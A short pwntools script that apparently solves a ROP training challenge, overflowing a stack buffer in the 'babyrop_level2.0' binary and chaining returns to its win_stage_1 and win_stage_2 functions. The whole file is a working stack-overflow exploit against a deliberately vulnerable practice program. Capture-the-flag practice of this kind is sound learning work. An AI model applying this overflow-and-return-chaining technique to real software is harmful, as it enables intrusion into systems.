from pwn import *
# Init
elf = ELF("/challenge/babyrop_level2.0")
context.arch = "amd64"
context.endian = "little"


# Vars
buffer_length = 108 + 4 + 8 # local_78 and variable int 4 byte (local_c) + EBP
ret_address_win_stage_1_function = p64(elf.symbols.win_stage_1)
ret_address_win_stage_2_function = p64(elf.symbols.win_stage_2)
io = elf.process()

# Payload
payload = b"A"*buffer_length + ret_address_win_stage_1_function + ret_address_win_stage_2_function

# Action
io.sendline(payload)
io.interactive()